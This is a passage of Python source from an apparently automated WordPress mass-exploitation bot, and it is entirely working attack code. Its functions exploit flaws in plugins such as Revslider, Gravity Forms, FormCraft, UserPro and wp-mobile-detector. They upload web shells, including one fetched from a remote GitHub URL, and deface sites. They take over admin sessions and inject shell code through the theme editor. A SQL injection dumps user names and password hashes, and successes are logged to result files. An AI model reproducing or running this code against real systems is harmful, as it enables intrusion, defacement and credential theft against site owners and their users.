                    IndeXpath = GetIndeXpath[0].split('"')[0].replace('\/', '/').split('/wp-content')[1]
                    UploadedIndEX = site + '/wp-content' + IndeXpath
                    Checkindex = requests.get('http://' + UploadedIndEX, timeout=5)
                    if 'GIF89a' in Checkindex.text.encode('utf-8'):
                        self.Print_Vuln_index(UploadedIndEX)
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(UploadedIndEX + '\n')
                    else:
                        self.Print_NotVuln('Wp-Job-Manager', site)
                except:
                    self.Print_NotVuln('Wp-Job-Manager', site)
            else:
                self.Print_NotVuln('Wp-Job-Manager', site)
        except:
            self.Print_NotVuln('Wp-Job-Manager', site)


    def wp_mobile_detector(self, site):
        try:
            ExploitShell = '/wp-content/plugins/wp-mobile-detector/resize.php?src=' \
                           'https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/settings_auto.php'
            ExploitGifUpload = '/wp-content/plugins/wp-mobile-detector/resize.php?src=' \
                           'https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/br4in.gif'

            Ex = '/wp-content/plugins/wp-mobile-detector/resize.php'
            GoT = requests.get('http://' + site + Ex, timeout=5)
            if 'GIF89a' in GoT.text.encode('utf-8'):
                requests.get('http://' + site + ExploitGifUpload)
                requests.get('http://' + site + ExploitShell)
                PathGif = '/wp-content/plugins/wp-mobile-detector/cache/br4in.gif'
                PathShell = '/wp-content/plugins/wp-mobile-detector/cache/settings_auto.php'
                Check1 = 'http://' + site + PathGif
                Check2 = 'http://' + site + PathShell
                CheckIndex = requests.get(Check1, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    CheckShell = requests.get(Check2, timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        Xshell = requests.get("http://" + site + "/wp-content/payload3.php", timeout=5)
                        if 'Vuln!!' in Xshell.text.encode('utf-8'):
                            self.Print_vuln_Shell(site + "/wp-content/payload3.php")
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + "/wp-content/payload3.php" + '\n')
                        Xindex = requests.get("http://" + site + "/br4in.htm", timeout=5)
                        if 'Vuln!!' in Xindex.text.encode('utf-8'):
                            self.Print_Vuln_index(site + '/br4in.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/br4in.htm' + '\n')
                    else:
                        self.Print_Vuln_index(site + '/wp-content/plugins/wp-mobile-detector/cache/br4in.gif')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/wp-mobile-detector/cache/br4in.gif' + '\n')
                else:
                    self.Print_NotVuln('wp-mobile-detector', site)
            else:
                self.Print_NotVuln('wp-mobile-detector', site)
        except:
            self.Print_NotVuln('wp-mobile-detector', site)

    def get_WpNoncE(self, source):
        try:
            find = re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"', source)
            path = find[0].strip()
            return path
        except:
            pass

    def get_WpFlag(self, source):
        try:
            find = re.findall('<option value="(.*?)" selected="selected">', source)
            path = find[0].strip()
            return path
        except:
            pass

    def UserProExploit(self, site):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                       'Accept': '*/*'}
            exploit = '/?up_auto_log=true'
            sess = requests.session()
            admin_re_page = 'http://' + site + '/wp-admin/'
            sess.get('http://' + site + exploit, timeout=10, headers=headers)
            Check_login = sess.get(admin_re_page, timeout=10, headers=headers)
            if '<li id="wp-admin-bar-logout">' in Check_login.text:
                with open('result/AdminTakeover_results.txt', 'a') as writer:
                    writer.write(site + exploit + '\n')
                ___Get_editor = admin_re_page + 'theme-editor.php?file=search.php#template'
                ___Get_edit = admin_re_page + 'theme-editor.php'
                Get_source = sess.get(___Get_editor, headers=headers, timeout=5)
                source = Get_source.text
                _Wp_FlaG = self.get_WpFlag(source)
                _Wp_NoncE = self.get_WpNoncE(source)
                __data = {'_wpnonce': _Wp_NoncE,
                          '_wp_http_referer': '/wp-admin/theme-editor.php?file=search.php',
                          'newcontent': self.shell_code,
                          'action': 'update',
                          'file': 'search.php',
                          'theme': _Wp_FlaG,
                          'scrollto': '0',
                          'docs-list': '',
                          'submit': 'Update+File'}
                sess.post(___Get_edit, data=__data, headers=headers)
                shell_PaTh = 'http://' + site + "/wp-content/themes/" + _Wp_FlaG + "/search.php"
                Check_sHell = sess.get(shell_PaTh, headers=headers)
                if 'wordpress_project' in Check_sHell.text:
                    __po = {'_upl': 'Upload'}
                    fil = {'file': open('Access.php', 'rb')}
                    requests.post(shell_PaTh, data=__po, files=fil)
                    shell_PaTh_DoNe = 'http://' + site + "/wp-content/themes/" + _Wp_FlaG + '/Access.php'
                    Got_Shell = requests.get(shell_PaTh_DoNe, timeout=5)
                    if 'b374k' in Got_Shell.text:
                        self.Print_vuln_Shell(site + "/wp-content/themes/" + _Wp_FlaG + "/Access.php")
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + "/wp-content/themes/" + _Wp_FlaG + "/Access.php" + '\n')
                    else:
                        self.Print_vuln_Shell(site + "/wp-content/themes/" + _Wp_FlaG + "/search.php")
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + "/wp-content/themes/" + _Wp_FlaG + "/search.php" + '\n')
                else:
                    self.Print_NotVuln('UserPro', site)
            else:
                self.Print_NotVuln('UserPro', site)
        except:
            self.Print_NotVuln('UserPro', site)


    def formcraftExploit_Shell(self, site):
        try:
            ShellFile = {'files[]': open(self.pagelinesExploitShell, 'rb')}
            Exp = 'http://' + site + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
            Check = requests.get(Exp, timeout=5)
            if '"failed"' in Check.text.encode('utf-8'):
                GoT = requests.post(Exp, files=ShellFile, timeout=5)
                if 'new_name' in GoT.text.encode('utf-8'):
                    GetIndexName = re.findall('"new_name":"(.*)",', GoT.text.encode('utf-8'))
                    IndexPath = site + '/wp-content/plugins/formcraft/file-upload/server/content/files/'\
                                + GetIndexName[0].split('"')[0]
                    CheckIndex = requests.get('http://' + IndexPath, timeout=5)
                    if CheckIndex.status_code == 200:
                        CheckShell = requests.get('http://' + site + '/wp-content/payload3.php', timeout=5)
                        CheckIndex = requests.get('http://' + site + '/br4in.htm', timeout=5)
                        if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                            self.Print_vuln_Shell(site + '/wp-content/payload3.php')
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + '/wp-content/payload3.php' + '\n')
                        if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                            self.Print_Vuln_index(site + '/br4in.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/br4in.htm' + '\n')
                        else:
                            self.formcraftExploitIndeX(site)
                    else:
                        self.formcraftExploitIndeX(site)
                else:
                    self.formcraftExploitIndeX(site)
            else:
                self.formcraftExploitIndeX(site)
        except:
            self.formcraftExploitIndeX(site)

    def formcraftExploitIndeX(self, site):
        try:
            ShellFile = {'files[]': open(self.Jce_Deface_image, 'rb')}
            Exp = 'http://' + site + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
            Check = requests.get(Exp, timeout=5)
            if '"failed"' in Check.text.encode('utf-8'):
                GoT = requests.post(Exp, files=ShellFile, timeout=5)
                if 'new_name' in GoT.text.encode('utf-8'):
                    GetIndexName = re.findall('"new_name":"(.*)",', GoT.text.encode('utf-8'))
                    IndexPath = site + '/wp-content/plugins/formcraft/file-upload/server/content/files/'\
                                + GetIndexName[0].split('"')[0]
                    CheckIndex = requests.get('http://' + IndexPath, timeout=5)
                    if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(IndexPath)
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(IndexPath + '\n')
                    else:
                        self.Print_NotVuln('formcraft', site)
                else:
                    self.Print_NotVuln('formcraft', site)
            else:
                self.Print_NotVuln('formcraft', site)
        except:
            self.Print_NotVuln('formcraft', site)



    def cherry_plugin(self, site):
        try:
            ShellFile = {'file': (self.pagelinesExploitShell, open(self.pagelinesExploitShell, 'rb')
                                  , 'multipart/form-data')}
            Exp = 'http://' + site + '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php'
            aa = requests.post(Exp, files=ShellFile, timeout=5)
            Shell = 'http://' + site + '/wp-content/plugins/cherry-plugin/admin/import-export/' \
                    + self.pagelinesExploitShell.split('/')[1]
            GoT = requests.get(Shell, timeout=5)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/payload3.php', timeout=5)
                CheckIndex = requests.get('http://' + site + '/br4in.htm', timeout=5)
                if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                    self.Print_vuln_Shell(site + '/wp-content/payload3.php')
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/payload3.php' + '\n')
                if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/br4in.htm')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/br4in.htm' + '\n')
                else:
                    self.Print_NotVuln('cherry plugin', site)
            else:
                self.Print_NotVuln('cherry plugin', site)
        except:
            self.Print_NotVuln('cherry plugin', site)

    def addblockblocker(self, site):
        try:
            ShellFile = {'popimg': open(self.pagelinesExploitShell, 'rb')}
            Exp = 'http://' + site + '/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
            requests.post(Exp, files=ShellFile, timeout=5)
            CheckShell = 'http://' + site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/' \
                         + self.pagelinesExploitShell.split('/')[1]
            GoT = requests.get(CheckShell, timeout=5)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/payload3.php', timeout=5)
                CheckIndex = requests.get('http://' + site + '/br4in.htm', timeout=5)
                if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                    self.Print_vuln_Shell(site + '/wp-content/payload3.php')
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/payload3.php' + '\n')
                if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/br4in.htm')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/br4in.htm' + '\n')
                else:
                    self.Print_NotVuln('Adblock Blocker', site)
            else:
                self.Print_NotVuln('Adblock Blocker', site)
        except:
            self.Print_NotVuln('Adblock Blocker', site)

    def HeadWayThemeExploit(self, site):
        try:
            CheckTheme = requests.get('http://' + site, timeout=5)
            if '/wp-content/themes/headway' in CheckTheme.text.encode('utf-8'):
                ThemePath = re.findall('/wp-content/themes/(.*)/style.css', CheckTheme.text.encode('utf-8'))
                ShellFile = {'Filedata': open(self.pagelinesExploitShell, 'rb')}
                useragent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

                url = "http://" + site + "/wp-content/themes/" + ThemePath[0] +\
                      "/library/visual-editor/lib/upload-header.php"
                Check = requests.get(url, timeout=5)
                if Check.status_code == 200:
                    GoT = requests.post(url, files=ShellFile, headers=useragent)
                    if GoT.status_code == 200:
                        Shell_URL = 'http://' + site + '/wp-content/uploads/headway/header-uploads/' +\
                                    self.pagelinesExploitShell.split('/')[1]
                        requests.get(Shell_URL, timeout=5)
                        CheckShell = requests.get('http://' + site + '/wp-content/payload3.php', timeout=5)
                        CheckIndex = requests.get('http://' + site + '/br4in.htm', timeout=5)
                        if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                            self.Print_vuln_Shell(site + '/wp-content/payload3.php')
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + '/wp-content/payload3.php' + '\n')
                        if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                            self.Print_Vuln_index(site + '/br4in.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/br4in.htm' + '\n')
                        else:
                            self.Print_NotVuln('Headway Theme', site)
                    else:
                        self.Print_NotVuln('Headway Theme', site)
                else:
                    self.Print_NotVuln('Headway Theme', site)
            else:
                self.Print_NotVuln('Headway Theme', site)
        except:
            self.Print_NotVuln('Headway Theme', site)


    def pagelinesExploit(self, site):
        try:
            FileShell = {'file': open(self.pagelinesExploitShell, 'rb')}
            PostData = {'settings_upload': "settings", 'page': "pagelines"}
            Useragent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            url = "http://" + site + "/wp-admin/admin-post.php"
            GoT = requests.post(url, files=FileShell, data=PostData, headers=Useragent, timeout=5)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/payload3.php', timeout=5)
                CheckIndex = requests.get('http://' + site + '/br4in.htm', timeout=5)
                if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                    self.Print_vuln_Shell(site + '/wp-content/payload3.php')
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/payload3.php' + '\n')
                if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/br4in.htm')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/br4in.htm' + '\n')
                else:
                    self.Print_NotVuln('Pagelines', site)
            else:
                self.Print_NotVuln('Pagelines', site)
        except:
            self.Print_NotVuln('Pagelines', site)


    def wysijaExploit(self, site):
            try:
                FileShell = {'my-theme': open(self.MailPoetZipShell, 'rb')}
                PostData = {'action': "themeupload", 'submitter': "Upload", 'overwriteexistingtheme': "on",
                        'page': 'GZNeFLoZAb'}
                UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                url = "http://" + site + "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes"
                GoT = requests.post(url, files=FileShell, data=PostData, headers=UserAgent, timeout=10)
                if 'page=wysija_campaigns&amp;action=themes&amp;reload=1' in GoT.text.encode('utf-8'):
                    sh = 'http://' + site + '/wp-content/uploads/wysija/themes/rock/payload3.php'
                    index = 'http://' + site + '/wp-content/uploads/wysija/themes/rock/br4in.gif'
                    CheckShell = requests.get(sh, timeout=5)
                    CheckIndex = requests.get(index, timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/wp-content/uploads/wysija/themes/rock/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/uploads/wysija/themes/rock/payload3.php' + '\n')
                    if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/wp-content/uploads/wysija/themes/rock/br4in.gif')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/uploads/wysija/themes/rock/br4in.gif' + '\n')
                    else:
                        self.Print_NotVuln('wysija', site)
                else:
                    self.Print_NotVuln('wysija', site)
            except:
                self.Print_NotVuln('wysija', site)



    def HD_WebPlayerSqli(self, site):
        try:
            check = requests.get('http://' + site + '/wp-content/plugins/hd-webplayer/playlist.php', timeout=5)
            if '<?xml version="' in check.text.encode('utf-8'):
                Exploit = '/wp-content/plugins/hd-webplayer/playlist.php' \
                          '?videoid=1+union+select+1,2,concat(user_login,0x3a,user_pass)' \
                          ',4,5,6,7,8,9,10,11+from+wp_users--'
                GoT = requests.get('http://' + site + Exploit, timeout=5)
                User_Pass = re.findall('<title>(.*)</title>', GoT.text.encode('utf-8'))
                username = User_Pass[1].split(':')[0]
                password = User_Pass[1].split(':')[1]
                self.Print_Vuln('HD-Webplayer', site)
                self.Print_Username_Password(username, password)
                with open('result/Sqli_result.txt', 'a') as writer:
                    writer.write('------------------------------' + '\n' + 'Domain: ' + site + '\n' +
                                 'Username : ' + username + '\n' + 'Password : ' + password + '\n')
            else:
                self.Print_NotVuln('HD-Webplayer', site)
        except:
            self.Print_NotVuln('HD-Webplayer', site)


    def Gravity_Forms_Shell(self, site):
        try:
            Grav_checker = requests.get('http://' + site + '/?gf_page=upload', timeout=5)
            if '"status" : "error"' in Grav_checker.text.encode('utf-8'):
                UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                fileDeface = {'file': open(self.gravShell, 'rb')}
                post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../', 'name': 'css.php5'}
                try:
                    url = "http://" + site + '/?gf_page=upload'
                    GoT = requests.post(url, files=fileDeface, data=post_data, headers=UserAgent, timeout=5)
                    if '.php5' in GoT.text.encode('utf-8'):
                        CheckShell = requests.get('http://' + site + '/wp-content/_input_3_css.php5', timeout=5)
                        if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                            Checkshell2 = requests.get('http://' + site + '/wp-content/payload3.php', timeout=5)
                            if 'Vuln!!' in Checkshell2.text.encode('utf-8'):
                                Checkshell = requests.get('http://' + site + '/wp-content/payload3.php', timeout=5)
                                CheckIndex = requests.get('http://' + site + '/br4in.htm', timeout=5)
                                if 'Vuln!!' in Checkshell.text.encode('utf-8'):
                                    self.Print_vuln_Shell(site + '/wp-content/payload3.php')
                                    with open('result/Shell_results.txt', 'a') as writer:
                                        writer.write(site + '/wp-content/payload3.php' + '\n')
                                if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                                    self.Print_Vuln_index(site + '/br4in.htm')
                                    with open('result/Index_results.txt', 'a') as writer:
                                        writer.write(site + '/br4in.htm' + '\n')
                                else:
                                    self.Gravity_forms_Index(site)
                            else:
                                self.Gravity_forms_Index(site)
                        else:
                            self.Gravity_forms_Index(site)
                    else:
                        self.Gravity_forms_Index(site)
                except Exception, e:
                    self.Print_NotVuln('Gravity-Forms', site)
            else:
                self.Print_NotVuln('Gravity Forms', site)
        except:
            self.Timeout(site)


    def Gravity_forms_Index(self, site):
        UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        fileDeface = {'file': open(self.Jce_Deface_image, 'rb')}
        post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../', 'name': 'br4in.gif'}
        post_data2 = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../../', 'name': 'br4in.gif'}
        try:
            url = "http://" + site + '/?gf_page=upload'
            requests.post(url, files=fileDeface, data=post_data, headers=UserAgent, timeout=5)
            requests.post(url, files=fileDeface, data=post_data2, headers=UserAgent, timeout=5)
            CheckIndex = requests.get('http://' + site + '/_input_3_br4in.gif', timeout=5)
            CheckIndex2 = requests.get('http://' + site + '/wp-content/_input_3_br4in.gif', timeout=5)
            if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                self.Print_Vuln_index(site + '/_input_3_br4in.gif')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/_input_3_br4in.gif' + '\n')
            elif 'GIF89a' in CheckIndex2.text.encode('utf-8'):
                self.Print_Vuln_index(site + '/wp-content/_input_3_br4in.gif')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/wp-content/_input_3_br4in.gif' + '\n')
            else:
                self.Print_NotVuln('Gravity-Forms', site)
        except Exception, e:
            self.Print_NotVuln('Gravity-Forms', site)

    def WP_User_Frontend(self, site):
        try:
            CheckVuln = requests.get('http://' + site + '/wp-admin/admin-ajax.php?action=wpuf_file_upload', timeout=5)
            if 'error' in CheckVuln.text or CheckVuln.status_code == 200:
                post = {}
                UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                post['action'] = 'wpuf_file_upload'
                files = {'wpuf_file': open(self.Jce_Deface_image, 'rb')}
                try:
                    _url = 'http://' + site + "/wp-admin/admin-ajax.php"
                    _open = requests.post(_url, files=files, data=post, headers=UserAgent, timeout=10)
                    if 'image][]' in _open.text.encode('utf-8'):
                        _Def = site + "/wp-content/uploads/20" + self.year + "/" + self.month + "/" + self.Jce_Deface_image.split('/')[1]
                        Check_Deface = requests.get('http://' + _Def, timeout=5)
                        if 'GIF89a' in Check_Deface.text.encode('utf-8'):
                            self.Print_Vuln_index(_Def)
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(_Def + '\n')
                        else:
                            self.Print_NotVuln('WP-User-Frontend', site)
                    else:
                        self.Print_NotVuln('WP-User-Frontend', site)
                except:
                    self.Print_NotVuln('WP-User-Frontend', site)
            else:
                self.Print_NotVuln('WP-User-Frontend', site)
        except:
            self.Print_NotVuln('WP-User-Frontend', site)


    def Revslider_css(self, site):
        IndeXText = 'Vuln!! Patch it Now!'
        ency = {'action': "revslider_ajax_action",
                'client_action': "update_captions_css",
                'data': "<body style='color: transparent;background-color: black'><center><h1>"
                        "<b style='color: white'>" + IndeXText + "<p style='color: transparent'>",

                }
        try:
            url = "http://" + site + "/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css"
            aa = requests.post(url, data=ency, timeout=5)
            if 'succesfully' in aa.text.encode('utf-8'):
                deface = site + '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css'
                self.Print_Vuln_index(deface)
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(deface + '\n')
            else:
                self.Print_NotVuln('Revslider', site)
        except:
            self.Print_NotVuln('Revslider', site)

    def Revslider_SHELL(self, site):
        try:
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            Exploit = 'http://' + site + '/wp-admin/admin-ajax.php'
            data = {'action': "revslider_ajax_action", 'client_action': "update_plugin"}
            FileShell = {'update_file': open(self.MailPoetZipShell, 'rb')}
            CheckRevslider = requests.get('http://' + site, timeout=5)
            if '/wp-content/plugins/revslider/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev = requests.get('http://' + site +
                                        '/wp-content/plugins/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/plugins/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/wp-content/plugins/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(site + '/wp-content/plugins/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/plugins/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/Avada/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev1 = requests.get('http://' + site +
                                         '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev1.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/striking_r/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev2 = requests.get('http://' + site +
                                         '/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev2.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/IncredibleWP/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev3 = requests.get('http://' + site +
                                         '/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev3.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/ultimatum/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev4 = requests.get('http://' + site +
                                         '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev4.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/medicate/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev5 = requests.get('http://' + site +
                                         '/wp-content/themes/medicate/script/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev5.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/medicate/script/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/medicate/script/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/medicate/script/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/medicate/script/revslider/temp/update_extract/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/medicate/script/revslider/temp/update_extract/br4in.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/centum/' in CheckRevslider.text.encode('utf-8'):
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                CheckRev6 = requests.get('http://' + site +
                                         '/wp-content/themes/centum/revslider/temp/update_extract/br4in.gif', timeout=5)
                if 'GIF89a' in CheckRev6.text.encode('utf-8'):
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/centum/revslider/temp/update_extract/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text.encode('utf-8'):
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/centum/revslider/temp/update_extract/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/centum/revslider/temp/update_extract/payload3.php' + '\n')
                    self.Print_Vuln_index(site + '/wp-content/themes/centum/revslider/temp/update_extract/br4in.gif')
